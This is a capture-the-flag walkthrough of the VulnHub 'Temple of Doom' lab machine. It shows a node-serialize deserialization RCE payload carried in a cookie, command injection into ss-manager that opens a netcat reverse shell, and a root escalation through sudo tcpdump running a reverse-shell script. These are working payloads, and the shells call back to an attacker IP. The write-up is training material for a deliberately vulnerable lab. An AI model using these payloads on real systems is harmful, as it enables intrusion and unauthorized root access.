@@ -1,0 +1,130 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Temple of Doom (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-temple-of-doom-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-25T07:34:26+00:00">July 25, 2018</time><time class="updated" datetime="2025-06-10T20:29:42+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Temple of Doom is a new CTF challenge VM on vulnhub made by <a style="color: #000000;" href="https://twitter.com/0katz">0katz</a>. You can download it from <a style="color: #000000;" href="https://www.vulnhub.com/entry/temple-of-doom-1,243/"><span style="color: #0000ff;">here</span></a>. The aim of this lab is to capture the flag in the root directory of the system. This lab is inspired by the Indiana Jones movie Temple of Doom. The level of this lab is <strong>intermediate.</strong></span></p>
+<p><span style="color: #000000;"><strong>Steps Involved</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Port scanning</span></li>
+<li><span style="color: #000000;">Burp intercept to capture cookies.</span></li>
+<li><span style="color: #000000;">Cookie processing for node serialize RCE vulnerability.</span></li>
+<li><span style="color: #000000;">Getting the current user by RCE.</span></li>
+<li><span style="color: #000000;">Getting a netcat shell for the current user.</span></li>
+<li><span style="color: #000000;">Discovering ss-manager being run as root.</span></li>
+<li><span style="color: #000000;">Exploiting command execution vulnerability on ss-manager to get a netcat shell</span></li>
+<li><span style="color: #000000;">Shell crafting from tcpdump and sudo</span></li>
+<li><span style="color: #000000;">Getting a netcat shell as root.</span></li>
+<li><span style="color: #000000;">Grabbing the flag.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s get started </strong></span></p>
+<p><span style="color: #000000;">First and foremost, we scanned the IP address with the most popular scanning tool called nmap. It discovered all the ports open on the victim’s system.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.130</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2ImdshFwXsw/W1gcSYKmzHI/AAAAAAAAYlQ/CVwmXARI5oATGs7Pa6HTZpm-rLGnJNAqwCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Hence, we observed that port 666 is hosting a <strong>node.js</strong> express framework so there must definitely be a web page at port 666. We tried to open the URL on the browser and obtained the following result.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aPAaC6Tse-E/W1gcUSkbytI/AAAAAAAAYl4/NRoOogBwr6MU46azonfOzkSFU1KynjaMQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We also opened the source code behind the page but nothing seemed to impress us. So, it was time to capture the page’s request using Burp Suite. Burp Suite acted as a proxy and revealed the activity going behind the front end.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-i-DCMo4KC_U/W1gcVL006XI/AAAAAAAAYmE/p1TE2DgQKwYIkFlZVczlFm32GeNkvCDKACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We got a cookie which was double encoded. It was a <strong>Base64 + URL</strong> encoding (because we observed “%3D” at the end of the cookie which is nothing but a URL encoding).</span></p>
+<p><span style="color: #000000;">So, we sent this request to the repeater and then decoded the cookie using these keyboard shortcuts:</span></p>
+<p><span style="color: #000000;"><strong>CTRL+SHIFT+U (to decode URL)</strong></span></p>
+<p><span style="color: #000000;"><strong>CTRL+SHIFT+B (to decode base64)</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qrtsKlqX-2M/W1gcVR30V6I/AAAAAAAAYmI/lJC05PZlADEjpKjgtG3iy8KNXx_id_g1ACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We observed the username and some token details in the cookie. But there was an add-on in the information when we refreshed the page again, it gave us an error like:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-T1iD7UkLCg0/W1gcVsnU9_I/AAAAAAAAYmM/IQzM_jDhQPYAcncjIIVXkd5ujRa7rCYQACLcBGAs/s1600/5_0.png"/></span></p>
+<p><span style="color: #000000;">So, it gave us a hint to look over at the cookie we just decoded. We observed that there was a missing quotation mark before <strong>Friday.</strong> Hence, we fixed the quotation mark first.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-191iRfLK070/W1gcVjUsx8I/AAAAAAAAYmQ/NwrR-SSXzdUF3RCzhe0MhXW8LDe_pfRhQCLcBGAs/s1600/5_1.png"/></span></p>
+<p><span style="color: #000000;">Then we encoded the cookie again to replicate the format of the cookie that we got before with the keyboard shortcuts:</span></p>
+<p><span style="color: #000000;"><strong>CTRL+B (To encode in base64)</strong></span></p>
+<p><span style="color: #000000;"><strong>CTRL+U (to encode in URL)</strong></span></p>
+<p><span style="color: #000000;">And then we forwarded it to observe the following output:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8e23mSIFdhA/W1gcVxhiEhI/AAAAAAAAYmU/Jeyz7BwpQEccLj8XEFjEvKZ64wFJshH6gCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">We inferred from the response of repeater that the page will output the username provided in the cookie.</span></p>
+<p><span style="color: #000000;">We looked at the cookie again, it was of the format:</span></p>
+<p><span style="color: #000000;"><strong>{“username”: “&lt;uname&gt;”, “csrftoken……..”}</strong></span></p>
+<p><span style="color: #000000;">We removed the rest of the token details first to check for any errors.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-53rEbiDCbrk/W1gcWZ76QTI/AAAAAAAAYmc/wiEsFmJHLFkHbxtulhb5a6qNfSQqrTIZQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We then encoded it and sent a request to the server and checked its response in the repeater.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-gLturtXvQHU/W1gcWfVUhLI/AAAAAAAAYmg/BUBViqcGymwGQHfvFP339HZy6QNNI0AxQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">It seemed to be working even without Token details. Then we edited the username with a custom input. Example:  <strong>{“username”:“Harshit” }</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LX5skkmvicQ/W1gcXLB8SeI/AAAAAAAAYmo/V9gaRk0OzlIJ2hPlnJiTN5vveASX3ok5ACLcBGAs/s1600/9_0.png"/></span></p>
+<p><span style="color: #000000;">Repeating the process of encoding it and sending it to the repeater yielded the following result to us.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xQnRHRORQbk/W1gcXMHDoZI/AAAAAAAAYms/9w8LupmitwICeY6non_O6EPf0CbV5wVogCLcBGAs/s1600/9_1.png"/></span></p>
+<p><span style="color: #000000;">Hence, we finally established that node-serialize was used. (You can read more about node-serialize <a style="color: #000000;" href="https://www.npmjs.com/package/node-serialize">here</a> ).</span></p>
+<p><span style="color: #000000;">What <strong><em>serialize</em></strong> does is that it determines, which data of the user object should be stored in the session. The user id (you provide as the second argument of the function) is saved in the session and is later used to retrieve the whole object via the <em>unserialize</em> function.</span></p>
+<p><span style="color: #000000;">Which turned out to be vulnerable! Refer to <a style="color: #000000;" href="https://github.com/luin/serialize">this</a> article to read about how <strong>node-serialize</strong> is vulnerable to <strong>Remote Code Execution</strong>!</span></p>
+<p><span style="color: #000000;">Hence, we used the shell provided to us by Ajin Abraham (on his <a style="color: #000000;" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">blog</a>) we modified the username argument with the shell.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://4.bp.blogspot.com/-yk1qaDkqIzY/W1gcSgYBMkI/AAAAAAAAYlY/IYn9dbdv0tw7Issnaj2FU72W14XXD_liACLcBGAs/s1600/10.png"/> </strong></span></p>
+<p><span style="color: #000000;">The shell:</span></p>
+<pre class="lang:default decode:true">{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=&gt;{console.log(out);}); }()"}</pre>
+<p><span style="color: #000000;">Explanation of the shell:</span></p>
+<p><span style="color: #000000;"><strong>_$$ND_FUNC$$_function() : </strong>Executes a function locally.</span></p>
+<p><span style="color: #000000;"><strong>child_process</strong> is a module in node.js that spawns child processes in a manner similar to popen(3).</span></p>
+<p><span style="color: #000000;"><strong>child_process.exec () method:</strong> This method runs a command in a console and buffers the output.</span></p>
+<p><span style="color: #000000;">It specifies string Shell to execute the command with ( Default: ‘/bin/sh’ on UNIX)</span></p>
+<p><span style="color: #000000;">So, the shell we made told us the current user on the Linux system. We encoded it and forwarded it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4IW9hOi8fsI/W1gcStXDc2I/AAAAAAAAYlU/o77Ajre2lGYUSGHNsZK7BF2njp45B97qwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Hence, the current user was <strong>nodeadmin</strong>.</span></p>
+<p> </p>
+<p><span style="color: #000000;">We then executed the command <strong>ls -lart</strong></span></p>
+<p><span style="color: #000000;">Encoded it and forwarded it and the following output was observed:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pcf_7ZKAmxQ/W1gcSxWGZXI/AAAAAAAAYlc/8pLhSVo_TZYcybzLxaRhzBq4-oPOVeQWQCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">After establishing this much information, we ran a reverse netcat shell command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cBbirJEmk-c/W1gcTNeC_gI/AAAAAAAAYlg/eK4H5GrX7TEpnFfbhhzEukjqAn9LlnJFgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Then we encoded it again and forwarded the request. Side by side, we activated a listener on kali and BOOM! We got a connection</span></p>
+<pre class="lang:default decode:true">id</pre>
+<p><span style="color: #000000;">It showed us the current user was nodeadmin.</span></p>
+<p><span style="color: #000000;">We then tried to spawn a TTY shell using python utility in the victim’s machine.</span></p>
+<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Which gave us a teletype!</span></p>
+<pre class="lang:default decode:true">cd /home
+ls
+cd fireman</pre>
+<p><span style="color: #000000;">Permission Denied!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ksTyp8px4iE/W1gcTeBIAeI/AAAAAAAAYlk/xnpSxidfabItuUBlF6081alAImEQcFFwQCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">We also observed that nodeadmin doesn’t have proper access to the folder fireman. Since nodeadmin is not the root, fireman directly or indirectly could give us the root.</span></p>
+<p><span style="color: #000000;">Let us see if any process is run by a fireman as root or not</span></p>
+<pre class="lang:default decode:true">ps aux | grep fireman</pre>
+<p><span style="color: #000000;">We observed that ss-manager is run by a fireman as root. After googling a little, we found that ss-manager was vulnerable to remote code execution (refer <a style="color: #000000;" href="https://github.com/shadowsocks/shadowsocks-libev/issues/1734">here</a>).</span></p>
+<p><span style="color: #000000;">ss-manager is short for Shadowsocks.</span></p>
+<p><span style="color: #000000;">Shadowsocks-libev is a lightweight secured SOCKS5 proxy for embedded devices</span><br/>
+<span style="color: #000000;">and low-end boxes. The ss-manager is meant to control shadowsocks servers</span><br/>
+<span style="color: #000000;">for multiple users, it spawns new servers if needed.</span></p>
+<p><span style="color: #000000;">Hence, we’ll use Shadowsocks with netcat command execution by:</span></p>
+<pre class="lang:default decode:true">nc -u 127.0.0.1 8839
+add: {“server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.106 4444 ||"}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QqlxWmXyAhM/W1gcTfR7sXI/AAAAAAAAYlo/f5gTo8CWKQYshwmFW7Hb13KICv-b9vyUQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Side by side, we activated a netcat listener and obtained a shell.</span></p>
+<p><span style="color: #000000;">Then, we spawned a teletype(TTY) using python again and then we checked for the sudoers list using:</span></p>
+<pre class="lang:default decode:true">id
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-UiSu45Dh-T8/W1gcTzHY9lI/AAAAAAAAYls/tNnZ1CXJ0XkaTkEtImtwAfm2tQfvUueygCLcBGAs/s1600/17.png"/></strong></span></p>
+<p><span style="color: #000000;">We observed that tcpdump is present which could also be used for remote code execution!</span></p>
+<p><span style="color: #000000;">To execute a shell, we moved to the directory <strong>/tmp </strong>since any user can read, write or execute files in this directory.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+echo "nc -e /bin/bash 192.168.1.106 8888" &gt; shell
+chmod 777 shell
+sudo tcpdump -ln -I eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root</pre>
+<p><span style="color: #000000;">The above commands changed the directory to tmp, created a file called shell with a reverse netcat shell, changed the permission of the file of that file to RWX and finally used sudo and tcp dump for remote code execution!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-yK6edv2_XvU/W1gcT9E5rOI/AAAAAAAAYlw/9TAuc73Qao8giuU395jxeRlV80ERcik1gCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-96X-0b8vvi4/W1gcUAn3wzI/AAAAAAAAYl0/8yvVTXTppHoYapb5neIDrK0rPlit-vPGACLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Side by side we setup a netcat listener:</span></p>
+<pre class="lang:default decode:true">nc -lvp 8888</pre>
+<p><span style="color: #000000;">Again, we spawned a teletype using python:</span></p>
+<pre class="lang:default decode:true ">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;"><strong>BOOM! We have the root access!</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HQovuQe3GBA/W1gcUXUZ_qI/AAAAAAAAYl8/LlED7cdVPoEijhb1ayPZskgeF0Cf9xJZgCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">In the end, we found the flag in the root directory!</span></p>
+<pre class="lang:default decode:true">cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;">CONGRATS! You too are a soldier now!</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://2.bp.blogspot.com/-8JRwxHeJjv4/W1gcUscE7yI/AAAAAAAAYmA/fHkySYucySIiBrzia5YssyeDs_7a5lyNgCLcBGAs/s1600/21.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
